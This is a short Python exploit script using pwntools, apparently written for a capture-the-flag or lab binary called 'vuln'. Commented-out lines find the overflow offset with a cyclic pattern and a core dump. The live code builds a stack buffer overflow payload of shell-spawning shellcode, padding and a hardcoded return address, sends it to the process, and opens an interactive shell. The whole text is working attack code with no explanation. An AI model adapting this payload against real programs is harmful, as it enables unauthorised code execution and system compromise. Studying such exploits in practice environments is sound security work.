from pwn import *

# elf = context.binary = ELF("vuln")
# context.log_level = "debug"

# p_pad = process(elf.path)
# p_pad.sendline("11")
# p_pad.sendline(cyclic(300))
# p_pad.wait()
# core = p_pad.corefile
# stack = core.rsp
# info("%#x stack", stack)

# pattern = core.read(stack, 4)
# info("%r pattern", pattern)

shellcode = asm(shellcraft.sh())
padding = (124 - len(shellcode)) * b"a"
address = p64(0x7fffffffdef0)
payload = shellcode + padding + address

p = process("./vuln")
p.sendline(b"11")
info("length of payload: %i", len(payload))
p.sendline(payload)
p.interactive()
